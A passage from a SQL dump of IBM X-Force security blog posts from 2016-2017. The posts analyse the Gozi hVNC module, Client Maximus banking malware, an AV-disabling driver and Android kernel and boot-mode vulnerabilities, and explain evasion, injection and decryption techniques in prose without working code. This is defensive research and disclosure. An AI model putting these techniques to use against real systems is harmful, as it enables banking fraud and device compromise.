process, and victims cannot see processes opened in the context of the new desktop. \n During a session, the victim can only see his or her desktop. The attacker, who can only see and control his or her own version of the desktop, cannot see the victim’s screen. When it comes to online banking fraud, cybercriminals use webinjection configurations to control their financial malware. That is how they configure the malware to take screenshots when visiting target webpages and inject malicious code into other targeted pages. Interestingly, this is also where some fraudsters, such as those behind the Gozi Trojan, store the download URLs for their hVNC modules. According to IBM X-Force research, the   is controlled by a small number of organized cybercrime groups. Its operators use the hVNC module in their fraud attacks all over the world. For these reasons, we will use Gozi as an example for the purpose of analyzing its hNVC module. Gozi’s stores the hVNC module on a remote server and fetches it once the server is installed on a newly infected endpoint. The downloaded hVNC module is initially encrypted, but by understanding how the malware decrypts its hVNC module, we were able to trace its steps back and decipher it on our own. The encryption process at hand has two phases. First, the module is encrypted using the Serpent cipher with a randomly generated key, which is appended to the encrypted module. Next, the encrypted module and the Serpent key are encrypted using an RSA cipher. To decrypt the downloaded hVNC module, Gozi begins by decoding the RSA layer using a key hidden in its own binary. The malware then obtains the Serpent key and uses it to decrypt the first layer of encryption. What’s left is the decrypted hVNC module. Next, Gozi injects the hVNC module into a new explorer.exe any new process it creates. \n The code injection technique is the same one the Gozi malware uses. The top-level flow is as follows: Once deployed via the target explorer.exe process, the hVNC module starts communication with a remote server. The server’s address is hardcoded into its binary. The communication begins with the client sending a globally unique identifier (GUID), which identifies the victim’s machine. \n Following that first communication, the client attempts to access the server over port 443 and begins the VNC session using the remote frame buffer (RFB) protocol. \n From here on, a standard VNC session takes place — if you can call stealing money from unsuspecting victims standard, that is. To completely understand how things work when an attacker deploys the hVNC module, we simulated the attack scenario in our lab, where we control both the attacking and the victimized machine. To do this, we used the hVNC module we obtained from Gozi, which assumes the role of a VNC server. The client can be any free VNC viewer that supports listening mode. We need to perform the following to set up an attack: We kicked off by injecting the hVNC module into explorer.exe using a standard dynamic link library (DLL) injection technique. Next, to enable the hVNC to communicate with our attacking machine, we commanded it to use our IP instead of its hardcoded one. As for overcoming the protocol differences, we already know that hVNC sends an additional message to identify the victim before starting the VNC session from the initial communication and sending a GUID to the attacker. Standard VNC viewers aren’t designed to handle that message, so the session will break before it even begins. To resolve this problem, we had to drop the first message the client sent. After applying the changes, we used a preconfigured VNC viewer in listening mode on the attacking machine. The victim machine initiated the connection and we were able to completely control the victim without anything suspicious showing on the screen. Hidden VNC is one of many hallmarks of financial malware. Although not new, it is still popular and common in online banking fraud today. Cybercriminals use remote control in a variety of fraud scenarios, with and without actual malware on the victim’s endpoint. We plan to explain more about this hVNC capability and show a demo of it in upcoming security conferences. In the meantime, banks and financial organizations can protect customers from remote control-enabled fraud with tools such as   and about  . MD5 of the VNC module we analyzed: c24800a5d619b555f93e42845417a5e5 Relevant Gozi Trojan MD5: 3CDA89FB87EC5CC6DFE7099A71612B8F', '\'Advanced Threats\', \'Gozi\', \'Gozi Trojan\', \'IBM X-Force Research\', \'Malware\', \'Virtual Network Connection (VNC)\', \'X-Force\'', 'https://securityintelligence.com/anatomy-of-an-hvnc-attack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (142, 'Expanding Threat Intelligence in IBM X-Force Exchange', 'Security Intelligence Staff', '2017-1-19', 'Like a journalist, a security analyst must check multiple sources for additional information to verify or invalidate an assumption. Until recently, this was a rather tedious task. An analyst would have to reference various threat intelligence sites, enter the observable information in question and merge that data back into the main view. According to our research, analysts often do this with   and text files. Now researchers can compile this data into a collection on IBM X-Force Exchange to share findings with colleagues and the security community at large. The newly introduced Threat Feed Manager simplifies the task of getting data out of various sources and into one view. You can enable those threat intelligence sources directly on the   by providing the credentials of those providers. The platform will then integrate the data into X-Force Exchange directly without the need to access additional sources one by one. As of now, the following third-party threat intelligence feeds are available in the Threat Feed Manager: To take advantage of this capability, IT professionals should first open the Settings page by opening the user side panel on the top right and clicking the link at the bottom. From there, navigate to the Integrations section and input the credentials of the third-party sources you want to access. The authentication required can vary from a simple token to an   key and password. Next, switch the Enabled button on to enable the source and find the report page you want to research, such as an IP address or URL. The platform will present data from the applicable configured sources. To see for yourself how easy it is to integrate   data in X-Force Exchange, check out this 30-second video: \n You can also register for a webinar titled “ ” to learn more about using threat intelligence in your security program.', '\'IBM X-Force Exchange\', \'Threat Intelligence\', \'Threat Sharing\', \'X-Force\', \'X-Force Features\'', 'https://securityintelligence.com/expanding-threat-intelligence-in-ibm-x-force-exchange/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (143, 'Going Inside an Arbitrary Kernel Write Vulnerability in the Nexus 9 (CVE-2016-3873)', 'Sagi Kedmi', '2017-1-17', 'The   recently discovered an arbitrary write vulnerability in Nexus 9’s kernel (the Tegra kernel branch). Google’s Android Security Team acknowledged the vulnerability, which allows a privileged attacker to arbitrary write values within kernel space, and assigned it a  . Kernel arbitrary write primitives can be used to achieve kernel code execution, which completely compromises the security of the device, not including TrustZone. It increases the TrustZone attack surface and allows attackers to access application data and override the Security-Enhanced Linux (SELinux) policy. The vulnerability has existed since Nexus 9’s inception back in November 2014. It was reported to the Android Security Team on June 20, 2016, and fixed on Sept. 5, 2016. This flaw was verified on what were then the latest Nexus 9 images: The   is initialized with the following write file operation: That is, on   system call,   securely copies a user space buffer and parses its contents as two numeric values:   a value to be written, and   an offset from a constant address. C  is then fed with   and   (cast into a four-byte aligned address). Eventually,   is used to write value   at  +, which results in an arbitrary kernel write. The vulnerability is reminiscent of an issue previously disclosed by security researcher  . We analyzed the Discretionary Access Control (DAC) and Mandatory Access Control (MAC; SELinux on Android) to find out which active processes can trigger the vulnerability. DAC-wise, who can write to the file? The attacker must execute code under   within the   SELinux context: SELinux-wise, what contexts can write to a debugfs file? To find out which SELinux contexts can trigger the vulnerability, we analyzed Nexus 9’s (MOB30M)  . We need to find SELinux domains with   rules that have target type   with the   and   permissions on the file class. Analyzing Nexus 9’s   (MOB30M) yields: That is,  -wise, any domain can  ,   and   to any file with the   context. What active processes can trigger the vulnerability? Analyzing active processes on the device yields the following: Code execution within any of the processes above can trigger and exploit the vulnerability. To exploit the vulnerability from an untrusted application security context, start by escalating privileges from an untrusted app to one of the contexts of the aforementioned processes. For instance,  , disclosed by Zach Riggle, may be used, since it allows an untrusted app to execute code within  . The   indicates that Google simply removed the   file from the   file system. Clearly, the   file node was not needed on production builds.', '\'Android\', \'Android Security\', \'Android Vulnerability\', \'Google\', \'IBM X-Force Research\', \'Mobile Security\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/going-inside-an-arbitrary-kernel-write-vulnerability-in-the-nexus-9/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (144, 'Client Maximus: New Remote Overlay Malware Highlights Rising Malcode Sophistication in Brazil', 'Or Safran', '2017-1-10', 'The   is notorious for its plethora of Delphi-based code and overall lack of sophistication. But much like the Russian-speaking malware scene, Brazilian cybergangs have been using better malware, such as the recently discovered Client Maximus, in their attacks. In the summer of 2016, malware like Zeus   and   were spotted in Brazil. Those were followed by intensifying infection campaigns, all targeting Brazilian banks and payment platforms, according to data from  . Later in the year year, our researchers spotted a new,   attack in Brazil, which introduced automation and agility to classic phishing attacks. It quickly became clear that cybercriminals in Brazil are   with counterparts from other, more sophisticated threat landscapes and importing code and expertise to launch attacks in their own country. We recently encountered a case in Brazil that reflects this ongoing trend. Client Maximus is a new malware code that appears to have been written specifically for attacks on Brazilian banks. The malware was recently analyzed alongside   related to it, leading to further findings and a greater overall understanding of the growing sophistication of cybercrime tools in Brazil. The purpose of the Client Maximus malware is financial fraud. As such, its code aspires to create the capabilities that most banking Trojans have, which allow attackers to monitor victims’ web navigation and interrupt online banking session at will. After taking over a victim’s banking session, an attacker operating this malware can initiate a fraudulent transaction from the account and use social engineering screens to manipulate the unwitting victim into authorizing it. \n The initial infection begins with a malicious, obfuscated WScript. Upon deobfuscating the script, we discovered that its goal is to download and execute JavaScript on the target endpoint. The JavaScript fetched by the malicious code here is a larger snippet that runs several antivirus checks and eventually downloads and executes the actual malware. The malware aims to: The attacker sets up the malware to commit financial fraud. Client Maximus is deployed on the endpoint in two different ways. The first method calls for it to be deployed as a custom NSIS Installer. The malware binary is a custom-compiled version of Nullsoft Scriptable Install System (NSIS), which extracts three files into %TEMP% folder. The first file is system.dll, the second file is a malicious dynamic link library (DLL) and the third is the encrypted payload. System.dll is part of a plug-in for the NSIS installer. It’s actually a legitimate DLL the malware leverages to call its own malicious DLL. After the malware loads the malicious DLL into its own process memory space and calls it using the aforementioned plug-in, the malicious DLL is used to decrypt the payload and load it into the process memory. The activity is subsequently performed by the now-decrypted file. The Client Maximus malware binary is usually deployed to the current user’s AppData folder with a unique name that depends on the dropper. Unlike most financial malware, the malware itself creates its persistence from the location it runs from. It neither generates a new name nor copies itself to a new location. In most cases the malware’s persistence is set under the endpoint’s run key (HKCU hive), pointing to the malware’s NSIS binary. In some cases, persistence is achieved by setting a link file to the malware binary’s path under the user’s startup folder. Client Maximus can also be deployed via DLL hijacking and new technology file system (NTFS) alternate data streams (ADS). In this second deployment style, the malware uses a legitimate binary file, signed by a leading technology vendor, with a malicious DLL in the same folder. While there are many forms of DLL hijacking, the author of Client Maximus used the search path method to achieve it. This method relies on the binary to load DLLs from the application’s current working directory before searching in other directories. It then replaces the original DLL the application tries to load with another DLL, which causes the application to load a different DLL from the original, legitimate program intended to load. In our case, when Client Maximus is deployed on the infected system, it also creates a malicious DLL, the name of which is determined by the internal name of the aforementioned legitimate library. That causes the legitimate executable to load the malicious DLL and execute it while creating the illusion that the original, harmless file is performing normal activity. Below are some examples of legitimate binaries and the malicious DLL they hijack: The malicious DLL inside the legitimate process tries to load the encrypted payload from an NTFS ADS. We assume the malware author used NTFS ADS to remain hidden from the user or antivirus tools, although this method is not new. We can use the Sysinternals Process Monitor to see when it actually loads the NTFS ADS while Windows continues to show this file as empty. In the image below, e2iU0L appears to be of size 0 KB, although it does have contents in reality. We can also see that a file named dbghelp.dll is being used to perform the DLL-hijacking. In the next image, we can see that the malware (s9TLNV.exe) reads the encrypted payload using an NTFS-stream: After the malware is fully installed on the target endpoint, it is designed to allow a remote attacker to take control of the endpoint based on a triggered action from the victim. Much like other financial malware, the trigger is navigation to a targeted bank’s website. To determine which sites the victim is accessing, the malware constantly monitors the titles of windows opened in the browser, hashes the titles and compares the hashes against a predefined list of hashes. Once a target match is detected, the malware connects to the attacker’s remote server to notify the fraudster, who can then initiate a remote access session using the malware’s remote-access Trojan (RAT) component. As a first step in the process described above, the malware monitors the victim’s activity, waiting for a targeted banking session to take place in the browser. To enable the monitoring, the malware takes the following actions: First, it registers to windows events that indicate the creation of new windows or window title change. Upon each of these events, the malware checks the new window title, using the SendMessage application program interface (API), with the “WM_GETTEXT” window message, which allows the malware to obtain each window’s title. Finally, the malware hashes the obtained window title and compares it to a list of prehashed targets. If the current hash matches one of the entries on the list, the malware initiates a network communication with the fraudster’s control server. The author chose to work with hashes in this case to hide the real target list from researchers. The logical flow of the fraudulent transaction is facilitated by overlay screens the fraudster uses to trick the victim into providing authentication elements. The flow of events for this new malware is no different than previous malicious code categorized under the remote overlay family: In the past year, we have borne witness to an  , introducing new coding styles to malware projects and revamping popular tools such as the remote overlay Trojan. As we move into 2017, Brazilian banks and payment providers should prepare for continued threat evolution in the country and plan ahead to detect and counter financial threats in new and improved forms. Banks wishing to protect their customers from evolving threats are invited to learn more about the   and to read our white paper, “ .” Individuals looking for tips on protecting themselves from remote overlay malware and other banking Trojans are invited to read our   article.', '\'Advanced Threats\', \'Banking\', \'Banking Trojan\', \'Brazil\', \'Cybercrime\', \'Financial Malware\', \'Fraud\', \'IBM X-Force Research\', \'Malware\', \'Overlay Attack\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/client-maximus-new-remote-overlay-malware-highlights-rising-malcode-sophistication-in-brazil/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (145, 'Android Vulnerabilities: Attacking Nexus 6 and 6P Custom Boot Modes', 'Roee Hay', '2017-1-5', 'In recent months, the   has discovered several previously undisclosed Android vulnerabilities. The   and   Android Security Bulletins included patches to one high-severity vulnerability, CVE-2016-8467, in Nexus 6 and 6P. Our new paper, “ ,” discusses this vulnerability as well as CVE-2016-6678. The paper describes how an attacker can use   or   to reboot a Nexus 6 or 6P device and implement a special boot configuration, or boot mode, which instructs Android to turn on various extra USB interfaces. These interfaces, notably the modem diagnostics interface, give attackers access to additional functionalities. This allows them to take over the Nexus 6 modem, thus compromising confidentiality and integrity. Access to the modem enables attackers to intercept phone calls, for example. The image below depicts the waveform of the receive channel of a successfully intercepted phone call: Attackers can also sniff mobile data packets. The image below illustrates how we successfully sniffed Long-Term Evolution (LTE) data: Furthermore, this level of access to the Nexus 6 modem allows attackers to find the exact GPS coordinates with detailed satellite information, place phone calls, steal call information and access or change nonvolatile (NV) items or the EFS partition. The PC malware or malicious charger can boot the Nexus 6/6P device with the special boot mode configuration if Android Debug Bridge (ADB) is enabled on the device. Developers use ADB for debugging, and users leverage it to sideload Android application packages (APKs) onto their devices. Once connected, the victim must authorize the PC or charger on the device if it wasn’t permanently authorized before the attack. Then, the attacker can simply issue the following commands: These commands will reboot the device with the special boot mode that enables the interfaces. Every future boot from this point forward will have the boot mode configuration enabled. This means the attack is persistent and no longer requires ADB to run, although it still requires USB access. Therefore, the attacker only needs the victim to enable ADB once. Moreover, a lucky attacker might wait for the device to be in fastboot mode, which requires no authorization from the victim. This, however, is less likely. In addition to the above boot mode changing technique, there is another way for physical attackers to boot the device with a custom boot mode. An attacker with physical access to a device can reboot it into the fastboot mode and select BP-Tools or Factory to set the relevant boot mode configuration, as illustrated below: The vulnerability affects the Nexus 6P less severely because the modem diagnostics are disabled in the modem’s firmware, which prohibits the nefarious activities described above. There are, however, additional USB interfaces that attackers can access, such as the modem AT interface, which is also vulnerable in Nexus 6. By accessing that interface, an attacker can send or eavesdrop on SMS messages and potentially  . An attacker can also access phone call information, change various radio settings and much more. The vulnerability in 6P enables the ADB interface even if it was disabled in the developer settings user interface (UI). With access to an ADB-authorized PC, a physical attacker could open an ADB session with the device and cause the ADB host running under the victim’s PC to RSA-sign the ADB authentication token even if the PC is locked. Such an ADB connection would enable an attacker to install malware on the device. PC malware on an ADB-authorized machine might also exploit CVE-2016-8467 to enable ADB and install Android malware. The PC malware waits for the victim to place the device in the fastboot mode to exploit the vulnerability. Upon further analysis, we found that another suspicious USB interface is enabled in Nexus 6 when booted with the custom boot mode. The interface identifies itself as “Motorola Test Command.” The kernel driver responsible for this interface is f_usbnet. Interestingly, this driver brings up an Ethernet-over-USB adapter, which can be configured from the host end. This allows for some exfiltration of network traffic. We also discovered a vulnerability in the f_usbnet driver itself, identified as  , in which 4–5 bytes of uninitialized kernel data are padded to every Ethernet frame carried over USB. This leak may contain sensitive data that could empower cybercriminals to exploit the system. The image below illustrates an ICMP frame that contains the leak: The X-Force team responsibly disclosed these Android vulnerabilities to Google prior to the publication of this blog. Google assigned a high level of severity to CVE-2016-8467 and mitigated it by forbidding a locked bootloader to boot with the dangerous boot modes. The first secure bootloader version of Nexus 6 is 71.22, released in the November 2016 Android Security Bulletin. The first secure bootloader version of Nexus 6P is 03.64, which was released as part of the January 2017 bulletin. Google assigned moderate severity to CVE-2016-6678 and mitigated it by zeroing out the padding so that uninitialized bytes won’t leak. The patch was released as part of Android’s October 2016 bulletin.', '\'Android\', \'Android Security\', \'Android Vulnerability\', \'Google\', \'IBM X-Force Research\', \'Mobile Malware\', \'Mobile Security\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/android-vulnerabilities-attacking-nexus-6-and-6p-custom-boot-modes/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (146, 'Exposing an AV-Disabling Driver Just in Time for Lunch', 'Lior Keshet', '2017-1-4', 'The   team detected a malicious AV-disabling driver while investigating new remote overlay malware attacking banks in  . The AV-disabling driver is part of a financial malware designed to empty infected victims’ bank accounts. What a way to start my morning. It’s 9:00 a.m. and I’ve yet to have my coffee. Where do I start? When trying to understand what an unknown piece of software does, there are two main approaches: the dynamic approach, whereby we execute the code using tools such as   and a debugger to see what it does; and the static approach, whereby we examine the code using a disassembler or decompiler. In this case, the malware is part of actual attacks, and time is of the essence. My goal is to understand exactly what this malicious driver does as quickly as possible and, ultimately, reduce mean time to detection and response. Since this particular driver doesn’t contain a large amount of code, I decide to start with the static approach. By now, two good things have already happened. First, I have my coffee in hand. Second, I have acquired an open instance of Interactive Disassembler (IDA) Pro to analyze a piece of code I’ve never seen before. The first thing I notice is the scarcity of functions. With only a dozen to examine, maybe I’ll have time for lunch today. At this point, it’s a good idea to look at the list of imported functions and strings for clues regarding the software’s functionality. The strings don’t look promising in this case: The imports, however, are a different story: Here I found the malware’s string creation and conversion (ASCII to Unicode) functions and, more interestingly, registry-writing functions. Malware authors use various methods to hide the malware’s list of imports, so we must account for the additional functions that may not appear in the screenshot above. Since the code is so short, I decided to start at the beginning, the DriverEntry. The first function call is compiler-generated and related to the security cookie. This isn’t interesting, so I skip forward: We can see in the figure above that this function calls sub_4011EA several times, each time with a different parameter between 1 and 5. Let’s take a moment to inspect the call graph, starting at sub_4011EA: We see that sub_401160 uses the registry-writing functions. Let’s check what exactly is being written. While we’re at it, let’s rename that function to something more meaningful: Write_To_Registry. Since assembly code tends to be longer and harder to grasp, I’ll use IDA’s   plugin, which translates the assembly to a C syntax code. This will significantly decrease the amount of code that is shown. Keep in mind, however, that the generated code isn’t always accurate. As shown above, Hex-Rays did a near-perfect job translating the code. Now we can easily understand what’s going on, with a little help from Microsoft’s Developer Network (MSDN) documentation. It seems the AV-disabling driver tries to access a specific registry key, which it receives as a parameter. If that key exists, the AV-disabling driver tries to write it into a value, which IDA identifies as ValueName. The data to be written, as we can see in the previous image, is “4.” But why only a near-perfect job? Note that the parameter the function receives is shown as an object type of HANDLE, but it is cast to a Unicode string at the very first line of code. To an experienced researcher, this doesn’t make any sense. From a quick look at the ObjectAttributes documentation from MSDN, we find that ObjectName indeed points to a string. On the other hand, a HANDLE is a numerical value and casting it into a string, once again, doesn’t make sense. So what’s going on here? It looks like IDA misdetected the types. At this point, there are two pivotal questions: To answer the first question, we’ll take a step back and look at the function that calls the function we just examined, which I renamed Write_To_Registry: The parameter we’re interested in from the above screenshot, UnicodeString, originated from sub_4010EA. This is also the function that determines our ValueName from the previous figure. Now we can answer the above questions by examining a single function. This is great news because I’m getting hungry. The function sub_4010EA gets two parameters: a1 and a2. a2 is a pointer to a string, and based on the calls to this function that we’ve seen previously, we can tell it’s actually an output parameter. The first part of the function is a loop that runs 0x1a7 times and fills a buffer with values taken from a different buffer after having each byte XORed by 0x8. This is simple decryption. Byte_403357 is used as a flag that signals whether the decryption already happened, verifying the XOR operation doesn’t happen more than once. I extracted the binary buffer and decrypted it. This is the result: The code seems to contain two parts. The first, in blue, looks like binary data. The second, in red, starts in the last line of the first part and looks like encrypted data. Another look at sub_4010EA reveals that the buffer we see here is passed to sub_401000, and so is the parameter a1. The result of sub_401000 will be returned to sub_4010EA within v3, which will then be passed to the output parameter a2, which, fortunately, is the value we’re interested in. At this point, I am tempted to change my approach. I can execute the driver within a virtual machine (VM), connect with a kernel debugger and examine the return values of sub_401000. I’m not sure which approach is quicker, so I decide to stick with the static approach, at least for now. The next function, sub_401000, is a little more complicated. First, let’s look at how it’s being called: It receives a1 from before, the XORed buffer and a constant — in this case, 1. The marked code above shows a search for the a2 parameter within a loop, which advances by seven with each iteration. At this point, I don’t want to get into the parsing process of the binary data since it may consume too much time. So what’s next? Inside the first loop, v9 marks where in the buffer we found the parameter. At the end of this function, we see calls to two additional functions, the second of which receives data from the XORed buffer at an offset that depends on the value of v9. I’m guessing the two function calls, sub_4010EA and sub_401000, are related to   or decryption. Let’s look at the first one: The top, marked part is an initialization of an array of length 256 (0x100), when each member of the array gets a value equal to its index. In other words, a[i] = i. Given this reality and the fact that the decryption consists of two functions, I strongly suspect the calls are related to  . Another look at the clock tells me it’s 11:30. If my intuition is wrong, this research is going to take a while longer. Again, I consider switching to the dynamic approach, but I decide to give the static method one last shot. I’ll assume the calls do, in fact, indicate RC4 encryption and re-examine sub_401000 to understand what exactly is being decrypted and with what key. I changed the names of the variables in this function to fit the RC4 theory: The key looks to be 8 bytes long. I follow the variable to where it’s stored and find the part where the key is generated: The code iterates the first 8 bytes of the XORed buff and derives the RC4 key by XORing each byte with 0x8. Note that the key length here is 8, which fits what we just saw. We are left to determine what is being decrypted. Again, it will take a while to answer this question accurately. What we do know, or can at least guess, is that some parts of the XORed_buff are being decrypted using RC4 with a key that we already have. To save time, I decided not to check what exactly is being decrypted. Instead, I would simply try to decrypt everything. RC4 is a stream cipher, so the decryption of each character depends on the cipher’s current state. To decrypt everything, I’ll have to first decrypt the buffer starting at each character up to 0x1A7 options. The code looks something like this: The outer loop starts at the end of the key, which is located at the start of the XORed buffer, and iterates the rest of the buffer. The internal loop performs RC4 decryption. As I expected, the result contains a lot of  , but it also contains plenty of meaningful stuff: There are, in fact, five such strings; each one corresponds to a different antivirus (AV) solution. The path within the string represents the location of the AV’s driver service. Let’s go back and look at the first function, overwrite_AV_reg_service, which is called five times with parameters of 1–5: The function gets an argument, decrypts the corresponding string from the encrypted buffer using the get_string function and writes data into the decrypted registry path using set_registry_value. Now that we know what the driver’s different functions do, we can look at the function call graph once again: The first function, main_func, is called five times with parameters of 1–5. For each parameter, get_string decrypts a different AV-related path. Then, set_registry_if_key_exists overwrites the registry path of that AV’s driver and prevents it from being loaded into the system. We also noticed that the malware using this driver causes the system to reboot after installing the driver. This causes the targeted AV software not to be loaded after the system restores, enabling the malware to execute without disturbance. The driver performs this action because the user-mode code can’t overwrite AV registry data; it employs self-protections to prevent exactly that. However, when executed by a driver, which can carry out more actions on a deeper privilege level, it is much harder to prevent such actions. And that’s it. We now know what the driver does, and I even have a few minutes to spare for lunch! When deciding between the dynamic and static approaches, I chose the latter method because it allowed me to understand how everything works internally. By dynamically obtaining the strings, I could learn what the driver does but not exactly how it does it. I conducted most of my research without using Hex-Rays due to the plugin’s inherent inaccuracies. I showed code mostly using Hex-Rays, however, for the sake of approachability. Finally, in truth, I am allowed to eat my lunch even if I do not complete a given task in the morning — and I don’t always show up for work at 9:00 a.m. sharp. Driver MD5: 48b872f91f1ff3f96594bf480ebf3dcc', '\'Banking\', \'Brazil\', \'Cybercrime\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/exposing-av-disabling-drivers-just-in-time-for-lunch/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (147, 'Attacks Targeting Industrial Control Systems (ICS) Up 110 Percent', 'Dave McMillen', '2016-12-27', 'Since IBM X-Force published its report, “ ,” last year, we have observed a startling increase in the number of attacks against these systems. According to   data, attacks targeting industrial control systems (ICS) increased over 110 percent in 2016 over last year’s numbers, as of Nov. 30. Specifically, the spike in ICS traffic was related to SCADA brute-force attacks, which use automation to guess default or weak passwords. Once broken, attackers can remotely monitor or control connected SCADA devices. In January 2016, GitHub released a   solution that contained a brute-force tool that can be used against Modbus, a serial communication protocol. The public release and subsequent use of this tool by various unknown actors likely led to the rise in malicious activity against ICS in the past 12 months. U.S.-based actors accounted for the majority of ICS attacks in 2016. This was not surprising, since the U.S. has the largest presence of   in the world. The U.S. was also the largest target of ICS-based attacks in 2016, primarily because, once again, it has a larger ICS presence than any other country at this time. ICS attacks, like other types of cyberthreats, have been increasing in scale and sophistication over the past few years. The rise is linked with the  . Let’s review a few high-profile cases reported over the last year from different parts of the world: The SFG malware, discovered in June 2016 on the networks of a European energy company, created a backdoor on targeted industrial control systems. The backdoor delivered a payload that was “used to extract data from or potentially shut down the energy grid,” according to security researchers at SentinelOne Labs, as reported by  . The Windows-based SFG malware is designed to bypass traditional antivirus software and firewalls. It contains all the hallmarks of a nation-state attack, likely of Eastern European origin. In March 2016, the U.S. Justice Department   by infiltrating the industrial controls of a dam in Rye Brook, New York. The attackers compromised the dam’s command-and-control (C&C) system in 2013 using a cellular modem. This is troubling because it represents one of the first major efforts of a foreign government entity to commandeer U.S. infrastructure. Although the attack happened in 2013, it wasn’t reported or attributed until 2016. In December 2015, a power company located in western Ukraine suffered a power outage that impacted a large area that included the regional capital of Ivano-Frankivsk,   reported. Investigatiors discovered that cybercriminals had faciliated the outage by using   to exploit the macros in Microsoft Excel documents. The bug was planted into the company’s network using  . These three attacks succeeded primarily due to the lack of situational awareness by both the employees and management of the firms in question. This is not surprising, given the increase of automation and internet connectivity within the industrial world. Government and private institutions around the world are starting to focus on mitigating risk to ICS. Cybercriminals are developing new threats on a daily basis that can, and eventually will, result in catastrophic utility outages. The threat to ICS permeates across a nation’s entire economy and infrastructure. Organizations across all verticals must take full responsibility for protecting their own assets and consumers. There should be no exceptions, since the best way to keep adversaries out of an ICS is to implement simple safeguards, best practices and  . You can download   from government entities like the National Institute of Standards and Technology (NIST), which also offers network protection advice for   in the industrial realms. For more information on protecting ICS from rising threats while continuing to enable technological advancements, read IBM X-Force’s research report, “ .” The report looks at the history of ICS, the susceptibility of these systems to certain attacks and ways to defend those systems.', '\'Energy and Utilities\', \'Energy Industry\', \'Industrial Control Systems (ICS)\', \'SCADA\'', 'https://securityintelligence.com/attacks-targeting-industrial-control-systems-ics-up-110-percent/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (148, 'Attackers Targeting Retail Are Shopping for Low-Hanging Fruit', 'Michelle Alvarez', '2016-12-22', 'The end of the year is often a time of reflection. What went wrong? What went right? If you’re a retailer that experienced a security breach in 2016, you’re likely reflecting on what went wrong and seeking to identify the gaps in your security landscape. Why? Because breaches are costly. In fact, the Ponemon Institute’s “ ” revealed that financial damage to online retail is escalating. In 2015, the retail sector experienced a significant increase in the cost of stolen data, from $105 per record in 2014 to $165 in 2015. In 2016, that amount rose to $172 per record in retail, substantially higher than the cross-industry average of $158. A   focusing on security trends in the retail industry highlighted the threats to retailers’ networks that drive many of the data breaches responsible for this financial damage. You may be surprised to learn that many successful attacks against retailers stem vulnerabilities characterized as low-hanging fruit. The top two attack vectors observed across   networks,   and SQL injection, exploit unpatched vulnerabilities. Attackers are compromising retail networks where basic security measures — identify, protect, detect and recover — have not been performed. \n As the intersection of personalization, privacy and security grows ever more complex, the challenge for retailers to protect their consumers’ sensitive information from the standpoints of both privacy and security intensifies. Attackers targeting the retail industry are less interested in taking down a site and more focused on obtaining valuable information such as credit card data. Even if businesses are collecting, storing and using information properly, they must monitor the types of attacks targeting their networks and seek ways to mitigate the exfiltration of their consumers’ data. For advice on how to address these threats and more insights about online retail security drawn from the recent  , download the full IBM report, “ .”', '\'IBM X-Force Research\', \'Network Security\', \'Retail\', \'Retail Industry\', \'Retail Security\', \'Shellshock\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/attackers-targeting-retail-are-shopping-for-low-hanging-fruit/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (149, 'Year in Review: Top Three Cybercrime Threats of 2016', 'Limor Kessem', '2016-12-20', '2016 saw cybersecurity become a  , reportedly affecting the U.S.  , and impacting   Americans have come to rely on. IBM X-Force researchers monitor 35 billion security events per day for over 4,500 companies in 133 countries. In this endeavor, they have found that among the many aspects of cybercrime threats and their detrimental effect on consumers and businesses, a few key threats emerged in 2016 and are not likely to subside in 2017: Ransomware, which is malware that encrypts digital data and holds it until the owner pays a ransom, has become a significantly effective security threat in 2016, since proving that people are motivated to pay to recover their data. In the past 12 months, cybercriminals have hit  ,   institutions,   departments,  , and other   by using ransomware. In most cases, the affected organization paid the ransom. Tallying losses for both businesses and consumers paints a grim picture for 2016. In the first 3 months of 2016, more than   in ransomware payments was paid in the U.S. Compared to 2015, that’s a dramatic 771 percent increase from a reported   for all of 2015. This puts ransomware on pace to become a $1 billion market for cybercriminals in 2016. The   urged victims to report any attacks so the agency can gain a more comprehensive view of the threat and its impact . With  , 2017 may be another record year for attackers spreading ransomware. To shed more light on the factors that drive consumers and businesses to pay to recover data, IBM Security fielded a ransomware survey that revealed an alarming state of affairs. The survey, which tallied responses from both individuals and business executives from different sized enterprises, showed an overall lack of awareness and preparedness in the face of the rising risk of ransomware attacks. According to the  , only one-third (31 percent) of consumers have actually heard of ransomware. That lack of awareness may shed light on why little or no action has been taken to protect devices and data: More than half the consumers interviewed do not take any proactive measures to protect themselves from this type of malware, yet they had high levels of confidence in their ability to protect personal devices. On the enterprise side, the IBM survey found that most employees are unaware of what ransomware is or how it can affect their company. When asked if they know what ransomware is, responses from business executives highlighted that knowledge about ransomware depends on business size and previous experience with similar attacks. Unsurprisingly, the survey also revealed that small and midsize businesses (SMBs) are less prepared than larger businesses. \n The Internet of Things (IoT) is the emerging third wave in the development of the internet. According to  , 5.5 million devices go online every day, and 1 million new IoT devices will be sold every hour  . Counting all connected devices, both consumer and industrial grade, the IHS predicted that the IoT market will grow to   and 75.4 billion in 2025 — far exceeding the number of humans on earth. The growth and explosive adoption of IoT in personal gadgets, home electronics, and medical and industrial applications has opened a wide door into the crime-ridden neighborhood that is the internet. In this hostile ground, where attackers already possess high levels of technical skills and malicious tools, IoT devices are often completely   to cybercrime threats. They are readily exploitable to malicious actors with relative ease and at scale. Using IoT devices as botnet members to flood targeted online resources is not new. What   new is the weaponization of mass amounts of IoT devices by actors using malware to automate controlling them and then launching massive distributed denial-of-service (DDoS) attacks. With most devices using default or hardcoded passwords, their security is nonexistent in the face of the 